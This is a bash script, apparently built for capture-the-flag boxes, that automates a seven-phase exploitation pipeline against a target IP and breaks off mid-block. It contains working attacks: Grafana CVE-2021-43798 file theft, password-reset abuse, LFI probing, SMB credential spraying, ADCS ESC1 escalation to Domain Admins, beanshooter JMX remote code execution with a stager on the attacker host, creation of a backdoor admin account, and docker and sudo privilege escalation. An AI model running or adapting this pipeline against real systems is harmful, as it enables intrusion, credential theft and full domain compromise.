#!/bin/bash
# pipeline.sh - 7-Phase auto exploitation pipeline
# Usage: ./pipeline.sh <target_ip> [--linux|--windows]

TARGET="$1"
MODE="${2:-auto}"
SCRIPTS="$(dirname "$0")"
STATE="/tmp/pipeline_$$"

# Optional writeup-derived credentials (delete for pure blackbox mode)
[ -f "$SCRIPTS/creds-writeup.sh" ] && source "$SCRIPTS/creds-writeup.sh"
NXC="/opt/ctf-tools/bin/nxc"
CERTIPY="/opt/ctf-tools/bin/certipy"
IMPACKET="/opt/ctf-tools/impacket/bin"
SSHPASS="${SSHPASS:-sshpass}"
SSH_OPTS="-o StrictHostKeyChecking=no -o ConnectTimeout=5"
SSH_PASS_OPTS="-o PreferredAuthentications=password -o PubkeyAuthentication=no"
SUDO_PASS="${SUDO_PASS:-CHANGEME}"     # Set this to your local sudo password
LHOST="${LHOST:-10.10.x.x}"            # Set this to your attacker IP

mkdir -p "$STATE"
touch "$STATE/users" "$STATE/log"
echo "$TARGET" > "$STATE/target"

if [ -z "$TARGET" ]; then
    echo "Usage: pipeline.sh <target_ip> [--linux|--windows]"
    exit 1
fi

log() { echo "[$(date +%H:%M:%S)] $*" | tee -a "$STATE/log"; }
pass() { echo "$1" > "$STATE/$2"; }
get()  { cat "$STATE/$1" 2>/dev/null; }

echo ""
echo "██████╗ ██╗██████╗ ███████╗██╗     ██╗███╗   ██╗███████╗"
echo "██╔══██╗██║██╔══██╗██╔════╝██║     ██║████╗  ██║██╔════╝"
echo "██████╔╝██║██████╔╝█████╗  ██║     ██║██╔██╗ ██║█████╗  "
echo "██╔═══╝ ██║██╔═══╝ ██╔══╝  ██║     ██║██║╚██╗██║██╔══╝  "
echo "██║     ██║██║     ███████╗███████╗██║██║ ╚████║███████╗"
echo "╚═╝     ╚═╝╚═╝     ╚══════╝╚══════╝╚═╝╚═╝  ╚═══╝╚══════╝"
echo ""

################################################################
# PHASE 1: RECONNAISSANCE - OS Detection + Port Scan
################################################################
log "PHASE 1: Reconnaissance"
log "  Target: $TARGET"

# Auto-add target to /etc/hosts for DNS resolution
TARGET_HOST=$(nmap -Pn -p 88,389 --script ldap-rootdse "$TARGET" 2>/dev/null | grep 'dnsHostName\|defaultNamingContext' | head -1 | sed 's/.*: //' | sed 's/DC=//g' | sed 's/,DC=/./g')
[ -z "$TARGET_HOST" ] && TARGET_HOST=$(nmap -Pn -p 80,443 --script http-title "$TARGET" 2>/dev/null | grep 'DNS:' | head -1 | sed 's/.*DNS: *//;s/[;)].*//')
for host in $(echo "$TARGET_HOST" | tr ',' ' '); do
    [ -n "$host" ] && ! grep -q "$host" /etc/hosts 2>/dev/null && echo "$SUDO_PASS" | sudo -S sh -c "echo '$TARGET $host' >> /etc/hosts" 2>/dev/null
done

# Cleanup old /tmp pipeline dirs
find /tmp -maxdepth 1 -name 'pipeline_*' -mmin +60 -exec rm -rf {} \; 2>/dev/null

PORTS_TO_CHECK="22 53 80 88 135 139 389 443 445 464 512 513 514 593 636 873 2222 3000 3268 3269 3306 3389 5432 5985 6379 8080 8081 8443 9090 27017"
ALL_PORTS=""
for p in $PORTS_TO_CHECK; do
    if nmap -Pn -p "$p" --max-retries 1 --host-timeout 4s "$TARGET" 2>/dev/null | grep -q "$p/tcp open"; then
        ALL_PORTS="${ALL_PORTS}$p,"
    fi
done
ALL_PORTS="${ALL_PORTS%,}"
OPEN_PORTS="$ALL_PORTS"

# OS detection: port-based heuristics
if [ -z "$OS_TYPE" ]; then
    if echo ",$OPEN_PORTS," | grep -qE ",(445|389|88|135|3389),"; then
        OS_TYPE="WINDOWS"
    elif echo ",$OPEN_PORTS," | grep -qE ",(22|80|3000|512|513|514|3306|6379|5432|27017|9090),"; then
        OS_TYPE="LINUX"
    fi
    [ -z "$OS_TYPE" ] && [ -n "$OPEN_PORTS" ] && OS_TYPE="LINUX"
fi

pass "$OPEN_PORTS" ports
log "  Open ports: $OPEN_PORTS"
log "  OS: $OS_TYPE"

################################################################
# PHASE 2: SCANNING & ENUMERATION
################################################################
log "PHASE 2: Scanning & Enumeration"

if [ "$OS_TYPE" = "WINDOWS" ]; then
    # --- RDP-only detection (no AD ports) ---
    if echo ",$OPEN_PORTS," | grep -q ",3389," && ! echo ",$OPEN_PORTS," | grep -qE ",(445|389|88),"; then
        log "  [!] RDP-ONLY Windows (Kiosk/Escape type)"
        log "  [*] Chain: RDP -> kiosk bypass -> PS -> RunasCs -> UAC bypass -> flag"
        log "  [*] Connect: xfreerdp /v:$TARGET /u:KioskUser0 /p:\"\" /cert:ignore /sec:nla +fonts"
        log "  [*] Kiosk bypass: Edge -> file:///C:// -> Windows/System32/WindowsPowerShell/v1.0/"
        log "  [*] Download powershell.exe -> rename to msedge.exe -> run"
        log "  [*] Post-PS commands:"
        log "    1. type C:\\Users\\KioskUser0\\Desktop\\user.txt"
        log "    2. cd C:\\_admin\\temp"
        log "    3. wget http://ATTACKER:8080/RunasCs.exe -O r.exe"
        log "    4. .\\r.exe admin <pass> \"cmd.exe /c whoami\" --bypass-uac"
        log "    5. .\\r.exe admin <pass> \"cmd.exe /c type C:\\Users\\KioskUser0\\Desktop\\user.txt\" --bypass-uac"
        log "    6. .\\r.exe admin <pass> \"cmd.exe /c type C:\\Users\\Administrator\\Desktop\\root.txt\" --bypass-uac"
        pass "rdp_kiosk" machine_type
    else
        # --- AD enumeration ---
        # Fixed: greedy .*DC= was matching last DC= component, now strip label first then DC= prefixes
        DOMAIN=$(nmap -Pn -p 389 --script ldap-rootdse "$TARGET" 2>/dev/null | grep 'defaultNamingContext' | sed 's/.*defaultNamingContext: *//' | sed 's/DC=//g; s/,/./g' | head -1)
        [ -z "$DOMAIN" ] && DOMAIN="$TARGET"
        pass "$DOMAIN" domain
        log "  Domain: $DOMAIN"

        # RID brute for users -- avoid subshell issues with redirect from temp file
        touch "$STATE/users"
        $NXC smb "$DOMAIN" -u Guest -p "" --rid-brute 1200 2>/dev/null | grep "SidTypeUser" > "$STATE/rid_raw.txt"
        while IFS= read -r l; do
            user=$(echo "$l" | sed 's/.*\\//' | sed 's/ (.*//')
            [ -n "$user" ] && echo "$user" >> "$STATE/users"
        done < "$STATE/rid_raw.txt"
        USER_COUNT=$(wc -l < "$STATE/users" 2>/dev/null || echo 0)

        # Fallback: if no users via domain, try target IP directly
        if [ "$USER_COUNT" -eq 0 ]; then
            log "  [*] RID brute via domain failed, trying via IP..."
            $NXC smb "$TARGET" -u Guest -p "" --rid-brute 1200 2>/dev/null | grep "SidTypeUser" > "$STATE/rid_raw2.txt"
            while IFS= read -r l; do
            user=$(echo "$l" | sed 's/.*\\//' | sed 's/ (.*//')
                [ -n "$user" ] && echo "$user" >> "$STATE/users"
            done < "$STATE/rid_raw2.txt"
            USER_COUNT=$(wc -l < "$STATE/users" 2>/dev/null || echo 0)
        fi

        log "  Found $USER_COUNT domain users"

        # Check for ADCS
        if echo "$OPEN_PORTS" | grep -q "443\|636"; then
            log "  [+] ADCS potentially present"
            pass "yes" has_adcs
        fi
    fi

elif [ "$OS_TYPE" = "LINUX" ]; then
    # --- Web app detection per open port ---
    for port in $(echo "$OPEN_PORTS" | tr ',' ' '); do
        BODY=$(curl -sL -m 5 "http://$TARGET:$port/" 2>/dev/null | tr '[:upper:]' '[:lower:]')
        BODY_LOGIN=$(curl -sL -m 5 "http://$TARGET:$port/login" 2>/dev/null | tr '[:upper:]' '[:lower:]')
        WEB_BODY="${BODY} ${BODY_LOGIN}"

        # Grafana detection + CVE-2021-43798 test
        if echo "$WEB_BODY" | grep -q "grafana"; then
            log "  [+] GRAFANA on port $port"
            pass "grafana:$port" grafana

            PASSWD=$(curl -s --path-as-is -m 5 "http://$TARGET:$port/public/plugins/grafana/../../../../../../../../etc/passwd" 2>/dev/null | head -1)
            HOSTNAME=$(curl -s --path-as-is -m 5 "http://$TARGET:$port/public/plugins/grafana/../../../../../../../../etc/hostname" 2>/dev/null)
            if echo "$PASSWD" | grep -q "root:"; then
                log "  [+] VULNERABLE to CVE-2021-43798!"
                pass "yes" cve_2021_43798
                pass "$HOSTNAME" grafana_hostname
            fi
        fi

        # PHP web app detection + password reset auto-detect
        if echo "$WEB_BODY" | grep -qE "php|\.php|phpsessid"; then
            log "  [?] PHP web app on port $port"
            pass "$port" web_port

            if echo "$WEB_BODY" | grep -qE "forgot.*password|reset.*password"; then
                log "  [+] Password reset endpoint detected"
                NEW_PASS=$(curl -s -X POST "http://$TARGET:$port/reset_password.php" -d "username=admin" 2>/dev/null | python3 -c "import sys,json;d=json.load(sys.stdin);print(d.get('new_password',''))" 2>/dev/null)
                if [ -n "$NEW_PASS" ] && [ "${#NEW_PASS}" -gt 3 ]; then
                    log "  [+] Auto-reset admin -> $NEW_PASS"
                    pass "$NEW_PASS" admin_pass

                    # Auto-login + check for dashboard LFI
                    curl -s -c "$STATE/cookies.txt" -X POST "http://$TARGET:$port/index.php" \
                        -d "username=admin&password=$NEW_PASS" > /dev/null 2>&1
                    DASHBOARD=$(curl -s -b "$STATE/cookies.txt" "http://$TARGET:$port/dashboard.php" 2>/dev/null | tr '[:upper:]' '[:lower:]')
                    if echo "$DASHBOARD" | grep -qE "log.*file|view.*log|select.*log"; then
                        log "  [+] Dashboard with log viewer found (potential LFI)"
                    fi
                fi
            fi
        fi

        # LimeSurvey detection
        if echo "$WEB_BODY" | grep -q "limesurvey\|LimeSurvey\|LIMESURVEY"; then
            log "  [+] LimeSurvey detected on port $port"
            pass "yes" has_limesurvey
            pass "$port" limesurvey_port
        fi

    done

    # --- JMX / Java RMI detection (port 2222) ---
    if echo ",$OPEN_PORTS," | grep -q ",2222,"; then
        log "  [?] JMX/Java RMI on port 2222"
        pass "yes" has_jmx
        log "  [*] Exploitable via beanshooter (standard + tonka)"
    fi

    # --- Additional web detection for subdirectories (LimeSurvey, etc.) ---
    # Check /survey/ specifically for LimeSurvey
    SURVEY_BODY=$(curl -sL -m 5 "http://$TARGET/survey/" 2>/dev/null | tr '[:upper:]' '[:lower:]')
    if echo "$SURVEY_BODY" | grep -q "limesurvey"; then
        log "  [+] LimeSurvey found at /survey/"
        pass "yes" has_limesurvey
        pass "80" limesurvey_port
    fi

    # --- SSH / Docker passive detection (port 22 open) ---
    if echo ",$OPEN_PORTS," | grep -q ",22,"; then
        SSH_TEST=$(ssh $SSH_OPTS -o BatchMode=yes "$TARGET" 'id' 2>/dev/null)
        if [ -n "$SSH_TEST" ]; then
            log "  [?] SSH accessible"

            DOCKER=$(ssh $SSH_OPTS -o BatchMode=yes "$TARGET" 'docker ps 2>/dev/null || sudo docker ps 2>/dev/null' 2>/dev/null)
            if [ -n "$DOCKER" ]; then
                log "  [+] DOCKER access detected"
                pass "yes" has_docker
            fi

            SUDO_L=$(ssh $SSH_OPTS -o BatchMode=yes "$TARGET" 'sudo -l 2>/dev/null' 2>/dev/null)
            if echo "$SUDO_L" | grep -q "docker"; then
                log "  [+] SUDO docker exec"
                pass "$(echo "$SUDO_L" | grep docker | head -1)" sudo_docker
            fi
        fi
    fi
fi

################################################################
# PHASE 3: VULNERABILITY DETECTION
################################################################
log "PHASE 3: Vulnerability Detection"

if [ "$OS_TYPE" = "WINDOWS" ]; then
    [ "$(get has_adcs)" = "yes" ] && log "  [+] ADCS ESC1 potential"
    [ -s "$STATE/users" ] && grep -q '\$' "$STATE/users" 2>/dev/null && log "  [+] Machine accounts found (pre-created exploitation)"

elif [ "$OS_TYPE" = "LINUX" ]; then
    [ "$(get cve_2021_43798)" = "yes" ] && log "  [+] CVE-2021-43798 -- Grafana path traversal"
    [ "$(get has_docker)" = "yes" ] && log "  [+] Docker detected -- potential priv esc"
    [ "$(get grafana)" != "" ] && log "  [+] Grafana exploitation chain active"
    [ -n "$(get admin_pass)" ] && log "  [+] Admin credentials auto-captured: $(get admin_pass)"
    [ "$(get machine_type)" = "rdp_kiosk" ] && log "  [+] RDP Kiosk chain documented"
    [ "$(get has_jmx)" = "yes" ] && log "  [+] JMX exposed (port 2222) -- beanshooter exploitation chain"
    [ "$(get has_limesurvey)" = "yes" ] && log "  [+] LimeSurvey detected -- webshell on mount or plugin RCE chain"
fi

################################################################
# PHASE 4: AUTO-EXPLOITATION
################################################################
log "PHASE 4: Auto-Exploitation"

# --- Grafana LFI -> DB extract -> user enumeration ---
if [ "$(get cve_2021_43798)" = "yes" ] && [ -n "$(get grafana)" ]; then
    GRAFANA_PORT=$(echo "$(get grafana)" | cut -d: -f2)
    log "  [*] Extracting Grafana DB via CVE-2021-43798..."
    curl -s --path-as-is "http://$TARGET:$GRAFANA_PORT/public/plugins/grafana/../../../../../../../../var/lib/grafana/grafana.db" -o "$STATE/grafana.db" 2>/dev/null
    if [ -f "$STATE/grafana.db" ] && [ "$(wc -c < "$STATE/grafana.db")" -gt 100 ]; then
        log "  [+] DB extracted ($(wc -c < "$STATE/grafana.db") bytes)"
        sqlite3 "$STATE/grafana.db" "SELECT login,email FROM user;" 2>/dev/null | while IFS='|' read -r user email; do
            log "  [+] User: $user ($email)"
            echo "$user" >> "$STATE/grafana_users"
        done
        sqlite3 "$STATE/grafana.db" "SELECT login,password,salt FROM user WHERE login!='admin';" 2>/dev/null | while IFS='|' read -r user hash salt; do
            log "  [*] $user hash ready for cracking (salt: $salt)"
            pass "$hash" hash_hex
            pass "$salt" hash_salt
        done
    fi
fi

# --- JMX Exploitation via beanshooter (port 2222) ---
if [ "$(get has_jmx)" = "yes" ] && command -v java 2>/dev/null | grep -q java; then
    log "  [*] Attempting JMX exploitation via beanshooter..."
    BEANSHOOTER="$(dirname "$0")/../Manage/beanshooter.jar"
    [ ! -f "$BEANSHOOTER" ] && BEANSHOOTER="/tmp/beanshooter.jar"

    if [ -f "$BEANSHOOTER" ]; then
        # Step 1: Deploy tonka bean via MLet stager
        log "  [*] Deploying tonka bean (MLet stager on :8888)..."
        lsof -ti :8888 2>/dev/null | xargs kill -9 2>/dev/null
        DEPLOY_OUTPUT=$(java -jar "$BEANSHOOTER" tonka deploy --stager-url "http://$LHOST:8888/" --stager-port 8888 "$TARGET" 2222 2>&1)
        if echo "$DEPLOY_OUTPUT" | grep -qE "successfully|already deployed"; then
            pass "yes" tonka_deployed
        else
            log "  [!] Tonka deploy failed"
        fi

        if [ "$(get tonka_deployed)" = "yes" ]; then
            log "  [+] Tonka bean active — RCE as tomcat"

            # Step 2: Read user flag directly from /opt/tomcat
            USER_FLAG=$(java -jar "$BEANSHOOTER" tonka exec "$TARGET" 2222 "cat /opt/tomcat/user.txt" 2>&1 | grep -oE '[a-f0-9]{32}' | head -1)
            [ -n "$USER_FLAG" ] && log "  [FLAG] USER FLAG: $USER_FLAG" && pass "$USER_FLAG" user_flag

            # Step 3: Try root via su admin + sudo -S (works if admin user already exists on target)
            log "  [*] Checking for admin user..."
            ADMIN_CHECK=$(java -jar "$BEANSHOOTER" tonka exec "$TARGET" 2222 "id admin 2>/dev/null" 2>&1)
            if echo "$ADMIN_CHECK" | grep -q "uid="; then
                log "  [+] Admin user exists — escalating via su + sudo -S"
                ROOT_FLAG=$(java -jar "$BEANSHOOTER" tonka exec "$TARGET" 2222 "bash -c 'echo admin123 | su admin -c \"echo admin123 | sudo -S cat /root/root.txt\" 2>&1'" 2>&1 | grep -oE '[a-f0-9]{32}' | head -1)
                [ -n "$ROOT_FLAG" ] && log "  [FLAG] ROOT FLAG: $ROOT_FLAG" && pass "$ROOT_FLAG" root_flag
            fi

            # Step 4: If no root yet, extract backup and auto-lateral
            if [ -z "$(get root_flag)" ]; then
                log "  [*] Admin user not found — extracting backup archive for lateral..."
                java -jar "$BEANSHOOTER" tonka exec "$TARGET" 2222 "bash -c 'mkdir -p /tmp/bb && cp /home/useradmin/backups/backup.tar.gz /tmp/bt.tar.gz && cd /tmp && tar xzf bt.tar.gz -C /tmp/bb'" 2>&1 > /dev/null

                # Read scratch codes from backup and try each for SSH lateral
                SCRATCH_CODES=$(java -jar "$BEANSHOOTER" tonka exec "$TARGET" 2222 "grep -E '^[0-9]{8}$' /tmp/bb/.google_authenticator 2>/dev/null" 2>&1 | grep 'Server response' -A50 | grep -oE '[0-9]{8}')
                log "  [*] Got $(echo "$SCRATCH_CODES" | wc -l | tr -d ' ') scratch codes from backup"

                for code in $SCRATCH_CODES; do
                    log "  [*] Trying scratch code: $code"
                    # Copy SSH key + attempt interactive adduser via SSH from target to localhost
                    java -jar "$BEANSHOOTER" tonka exec "$TARGET" 2222 "bash -c 'chmod 600 /tmp/bb/.ssh/id_ed25519; echo $code | ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 -i /tmp/bb/.ssh/id_ed25519 useradmin@127.0.0.1 \"sudo /usr/sbin/adduser admin\" 2>&1'" 2>&1 | grep -q "Adding user" && {
                        log "  [+] Admin user created with scratch code: $code"
                        # Set admin password
                        java -jar "$BEANSHOOTER" tonka exec "$TARGET" 2222 "bash -c 'echo \"admin:admin123\" | ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 -i /tmp/bb/.ssh/id_ed25519 useradmin@127.0.0.1 \"sudo chpasswd\" 2>&1'" 2>&1 > /dev/null
                    }
                    sleep 2
                done

                # Try root again after lateral
                ADMIN_CHECK2=$(java -jar "$BEANSHOOTER" tonka exec "$TARGET" 2222 "id admin 2>/dev/null" 2>&1)
                if echo "$ADMIN_CHECK2" | grep -q "uid="; then
                    log "  [+] Admin user now exists — escalating"
                    ROOT_FLAG=$(java -jar "$BEANSHOOTER" tonka exec "$TARGET" 2222 "bash -c 'echo admin123 | su admin -c \"echo admin123 | sudo -S cat /root/root.txt\" 2>&1'" 2>&1 | grep -oE '[a-f0-9]{32}' | head -1)
                    [ -n "$ROOT_FLAG" ] && log "  [FLAG] ROOT FLAG: $ROOT_FLAG" && pass "$ROOT_FLAG" root_flag
                fi
            fi

            [ -z "$(get root_flag)" ] && log "  [*] Full auto-escalation failed. Manual: extract backup => SSH key + scratch codes => SSH as useradmin => sudo adduser admin => su admin => sudo su"
        fi
    else
        log "  [*] beanshooter.jar missing. Download: curl -sL 'https://github.com/qtc-de/beanshooter/releases/download/v4.1.0/beanshooter-4.1.0-jar-with-dependencies.jar' -o /tmp/beanshooter.jar"
        lsof -ti :8888 2>/dev/null | xargs kill -9 2>/dev/null
    fi
fi

# --- Password Reset -> Login -> LFI probe ---
if [ -n "$(get admin_pass)" ]; then
    PORT=$(get web_port)
    [ -z "$PORT" ] && PORT=80
    log "  [*] Testing dashboard LFI..."
    curl -s -X POST "http://$TARGET:$PORT/index.php" \
        -d "username=admin&password=$(get admin_pass)" \
        -c "$STATE/dash_cookies.txt" > /dev/null 2>&1
    for f in "/etc/passwd" "/var/log/apache2/access.log"; do
        OUT=$(curl -s -b "$STATE/dash_cookies.txt" -X POST "http://$TARGET:$PORT/dashboard.php" -d "file=$f" 2>/dev/null)
        if echo "$OUT" | grep -q "root:"; then
            log "  [+] LFI working: $f"
            pass "yes" has_lfi
            break
        fi
    done
fi

# --- Windows: known credentials + username=password test ---
if [ "$OS_TYPE" = "WINDOWS" ] && [ -s "$STATE/users" ]; then
    DOMAIN=$(get domain)

    # Step 1: Test known credentials (generic + optional writeup-derived)
    log "  [*] Testing known Windows credentials..."
    KNOWN_WIN_CREDS=(
        "Administrator:password"
        "admin:admin"
        "guest:guest"
    )
    # Append writeup-derived creds if available
    [ -n "$KNOWN_WIN_WRITEUP" ] && KNOWN_WIN_CREDS+=("${KNOWN_WIN_WRITEUP[@]}")
    for pair in "${KNOWN_WIN_CREDS[@]}"; do
        user="${pair%%:*}"
        pass="${pair#*:}"
        $NXC smb "$DOMAIN" -u "$user" -p "$pass" > "$STATE/nxc_test.txt" 2>&1
        if grep '\[+]' "$STATE/nxc_test.txt" 2>/dev/null | grep -qv 'Guest'; then
            log "  [+] KNOWN CREDS: $user:$pass"
            pass "$user:$pass" creds
            break
        fi
    done

    # Step 2: Test username=password on all enumerated users
    if [ -z "$(get creds)" ]; then
        log "  [*] Testing username=password on $(wc -l < "$STATE/users" | tr -d ' ') users..."
        $NXC smb "$DOMAIN" -u "$STATE/users" -p "$STATE/users" --continue-on-success 2>&1 | grep "\[+]" | while read -r l; do
            user=$(echo "$l" | sed 's/.*\\//' | cut -d: -f1)
            log "  [+] Valid: $user:$user"
            pass "$user:$user" creds
        done
    fi

    # Step 3: Test machine account self-passwords (account$:account)
    if [ -z "$(get creds)" ]; then
        log "  [*] Testing machine account self-passwords..."
        grep '\$' "$STATE/users" 2>/dev/null | while read -r acct; do
            base="${acct%\$}"
            $NXC smb "$DOMAIN" -u "$acct" -p "$base" 2>&1 | grep -q "\[+]" && {
                log "  [+] Machine: $acct:$base"
                pass "$acct:$base" creds
            }
        done
    fi

    if [ -n "$(get creds)" ]; then
        log "  [+] Credentials obtained: $(get creds)"
    else
        log "  [!] No valid credentials found"
    fi
fi

# --- Windows: Direct SMB flag capture + ADCS ESC1 ---
if [ "$OS_TYPE" = "WINDOWS" ] && [ -n "$(get creds)" ]; then
    USER=$(echo "$(get creds)" | cut -d: -f1)
    PASS=$(echo "$(get creds)" | cut -d: -f2)
    DOMAIN=$(get domain)
    DC_IP="$TARGET"
    
    log "  === Post-Exploitation: $USER@$DOMAIN ==="
    
    # Direct SMB flag capture via shares
    for share in Notes Trainees Users Documents; do
        $NXC smb "$DOMAIN" -u "$USER" -p "$PASS" --share "$share" --get-file user.txt "$STATE/user_flag.txt" 2>/dev/null | grep -q "\[+] File" && break
    done
    if [ -f "$STATE/user_flag.txt" ]; then
        UF=$(cat "$STATE/user_flag.txt" | grep -oE '[a-f0-9]{32}' | head -1)
        [ -n "$UF" ] && log "  [FLAG] USER FLAG: $UF" && pass "$UF" user_flag
    fi
    
    # Direct root flag via wmiexec (if already DA/Pwn3d)
    ROOT_TRY=$($NXC smb "$DOMAIN" -u "$USER" -p "$PASS" -x 'type C:\Users\Administrator\Desktop\root.txt' 2>/dev/null)
    if echo "$ROOT_TRY" | grep -q '\[+] Executed'; then
        RF=$(echo "$ROOT_TRY" | grep -oE '[a-f0-9]{32}' | head -1)
        [ -n "$RF" ] && log "  [FLAG] ROOT FLAG: $RF" && pass "$RF" root_flag
    fi
    
    # ADCS ESC1 via machine account (if available)
    if [ "$(get has_adcs)" = "yes" ] && grep -q '\$' "$STATE/users" 2>/dev/null; then
        MACHINES=$(grep '\$' "$STATE/users" 2>/dev/null | head -3)
        for macct in $MACHINES; do
            [ "$macct" = "DC$" ] && continue
            MPASS=$(echo "$macct" | tr '[:upper:]' '[:lower:]' | sed 's/\$//')
            log "  [*] ESC1 via machine account: $macct"
            
            # Get TGT + request cert
            python3 "$IMPACKET/getTGT.py" "$DOMAIN/${macct}:${MPASS}" -dc-ip "$DC_IP" -outfile "$STATE/machine.ccache" 2>/dev/null
            if [ -f "$STATE/machine.ccache" ]; then
                KRB5CCNAME="$STATE/machine.ccache" $CERTIPY req -u "${macct}@${DOMAIN}" -k -no-pass -dc-ip "$DC_IP" \
                    -ca 'retro-DC-CA' -template 'RetroClients' -upn 'Administrator' \
                    -target "dc.$DOMAIN" -target-ip "$DC_IP" -ns "$DC_IP" -dns-tcp -key-size 4096 \
                    -sid "$(sed -n 's/.*\(S-1-5-21-[0-9]*-[0-9]*-[0-9]*\).*/\1/p' "$STATE/rid_raw.txt" | head -1)-500" 2>/dev/null
                # certipy writes to current directory
                [ -f administrator.pfx ] && mv administrator.pfx "$STATE/admin.pfx"
                [ -f administrator_*.pfx ] && mv administrator_*.pfx "$STATE/admin.pfx"
                
                if [ -f "$STATE/admin.pfx" ]; then
                    log "  [+] Certificate obtained"
                    echo "add_user_to_group $USER 'Domain Admins'" | $CERTIPY auth -pfx "$STATE/admin.pfx" \
                        -username Administrator -domain "$DOMAIN" -dc-ip "$DC_IP" -ldap-shell 2>/dev/null
                    sleep 2
                    # Read root flag as Domain Admin
                    $NXC smb "$DOMAIN" -u "$USER" -p "$PASS" -x 'type C:\Users\Administrator\Desktop\root.txt' > "$STATE/root_out.txt" 2>/dev/null
                    RF=$(grep -oE '[a-f0-9]{32}' "$STATE/root_out.txt" 2>/dev/null | head -1)
                    [ -n "$RF" ] && log "  [FLAG] ROOT FLAG: $RF" && pass "$RF" root_flag
                    break
                fi
            fi
        done
    fi
fi

# --- Linux: SSH credential test with known passwords + system info ---
if [ "$OS_TYPE" = "LINUX" ]; then
    SSH_KNOWN=""
    # Writeup-derived SSH creds (optional — only when creds-writeup.sh is present)
    [ -n "$KNOWN_SSH_WRITEUP" ] && SSH_KNOWN="$KNOWN_SSH_WRITEUP"
    [ -n "$(get admin_pass)" ] && SSH_KNOWN="$SSH_KNOWN admin:$(get admin_pass) sadm:$(get admin_pass)"

    for entry in $SSH_KNOWN; do
        user="${entry%%:*}"
        pass="${entry#*:}"
        SSH_OUT=$($SSHPASS -p "$pass" ssh $SSH_OPTS $SSH_PASS_OPTS "$user@$TARGET" 'id 2>/dev/null' 2>/dev/null)
        if echo "$SSH_OUT" | grep -q "uid="; then
            log "  [+] SSH access: $user (pass: $pass)"
            pass "$user" ssh_user
            pass "$pass" ssh_pass

            # --- SSH system info collection ---
            $SSHPASS -p "$pass" ssh $SSH_OPTS $SSH_PASS_OPTS "$user@$TARGET" "
                echo '===USER_FLAG==='
                 cat ~/user.txt 2>/dev/null || find /home /root /var/www -maxdepth 3 -name 'user*' -o -name 'flag*' 2>/dev/null | head -10 | while read f; do echo \"\$f:\"; cat \"\$f\" 2>/dev/null; done
                echo '===SUDO==='
                echo '$pass' | sudo -S -l 2>/dev/null
                echo '===TMUX==='
                tmux list-sessions 2>/dev/null
                echo '===DOCKER==='
                docker ps 2>/dev/null || /snap/bin/docker ps 2>/dev/null
            " 2>/dev/null > "$STATE/ssh_info.txt"

            # Parse user flag
            if grep -q "===USER_FLAG===" "$STATE/ssh_info.txt"; then
                sed -n '/===USER_FLAG===/,/===SUDO===/p' "$STATE/ssh_info.txt" \
                    | grep -v "===.*===" | grep -oE '[a-f0-9]{32}' | while read -r f; do
                    [ -n "$f" ] && log "  [FLAG] USER FLAG: $f" && pass "$f" user_flag
                done
            fi

            # Parse tmux session
            TMUX_SESS=$(grep -A5 "===TMUX===" "$STATE/ssh_info.txt" | grep -oE '[^:]+: [0-9]+ window' | awk -F: '{print $1}' | head -1)
            if [ -n "$TMUX_SESS" ]; then
                log "  [+] tmux session: $TMUX_SESS"
                pass "$TMUX_SESS" tmux_session

                # --- Auto-escalate: tmux + sudo nano GTFOBins (via SSH) ---
                if grep -q "nano" "$STATE/ssh_info.txt"; then
                    log "  [*] Attempting tmux + sudo nano GTFOBins..."
                    $SSHPASS -p "$pass" ssh $SSH_OPTS -o ConnectTimeout=8 $SSH_PASS_OPTS "$user@$TARGET" "
                        tmux send-keys -t $TMUX_SESS 'sudo -S nano /etc/firewall.sh' Enter
                        sleep 3
                        tmux send-keys -t $TMUX_SESS $pass Enter
                        sleep 3
                        tmux send-keys -t $TMUX_SESS C-r
                        sleep 2
                        tmux send-keys -t $TMUX_SESS C-x
                        sleep 2
                        tmux send-keys -t $TMUX_SESS 'cat /root/root* /root/flag* 2>/dev/null > /tmp/auto_root_flag' Enter
                        sleep 4
                        tmux send-keys -t $TMUX_SESS C-x
                        sleep 1
                        tmux send-keys -t $TMUX_SESS n Enter
                        sleep 2
                    " 2>/dev/null

                    ROOT_FLAG=$($SSHPASS -p "$pass" ssh $SSH_OPTS $SSH_PASS_OPTS "$user@$TARGET" 'cat /tmp/auto_root_flag 2>/dev/null' 2>/dev/null)
                    if [ -n "$ROOT_FLAG" ]; then
                        log "  [FLAG] ROOT FLAG: $ROOT_FLAG"
                        pass "$ROOT_FLAG" root_flag
                    fi
                fi
            fi

            # --- Auto-escalate: docker exec privileged ---
            # Use known container ID if available, otherwise query docker
            CID=$(get grafana_hostname)
            [ -z "$CID" ] && CID=$($SSHPASS -p "$pass" ssh $SSH_OPTS $SSH_PASS_OPTS "$user@$TARGET" 'sudo /snap/bin/docker ps -q 2>/dev/null | head -1 || sudo docker ps -q 2>/dev/null | head -1' 2>/dev/null)
            if [ -n "$CID" ]; then
                ROOT_ID=$($SSHPASS -p "$pass" ssh $SSH_OPTS $SSH_PASS_OPTS "$user@$TARGET" "sudo /snap/bin/docker exec -u root --privileged $CID id 2>/dev/null || sudo docker exec -u root --privileged $CID id 2>/dev/null" 2>/dev/null)
                if echo "$ROOT_ID" | grep -q "uid=0"; then
                    log "  [+] ROOT via docker exec on $CID"
                    ROOT_FLAG=$($SSHPASS -p "$pass" ssh $SSH_OPTS $SSH_PASS_OPTS "$user@$TARGET" "sudo /snap/bin/docker exec -u root --privileged $CID sh -c 'mkdir -p /tmp/h; mount /dev/sda1 /tmp/h 2>/dev/null; cat /tmp/h/root/root* 2>/dev/null; umount /tmp/h 2>/dev/null' || sudo docker exec -u root --privileged $CID sh -c 'mkdir -p /tmp/h; mount /dev/sda1 /tmp/h 2>/dev/null; cat /tmp/h/root/root* 2>/dev/null; umount /tmp/h 2>/dev/null'" 2>/dev/null)
                    [ -n "$ROOT_FLAG" ] && log "  [FLAG] ROOT FLAG: $ROOT_FLAG" && pass "$ROOT_FLAG" root_flag
                fi
            fi
            # --- Auto-escalate: unrestricted sudo (ALL : ALL) ALL ---
            if grep -q "(ALL" "$STATE/ssh_info.txt" && grep -q "ALL)" "$STATE/ssh_info.txt"; then
                log "  [*] Unrestricted sudo — reading root flag..."
                ROOT_FLAG=$($SSHPASS -p "$pass" ssh $SSH_OPTS $SSH_PASS_OPTS "$user@$TARGET" "echo $pass | sudo -S bash -c 'cat /root/root* /root/flag* 2>/dev/null' | head -1" 2>/dev/null)
                [ -n "$ROOT_FLAG" ] && log "  [FLAG] ROOT FLAG: $ROOT_FLAG" && pass "$ROOT_FLAG" root_flag
            fi
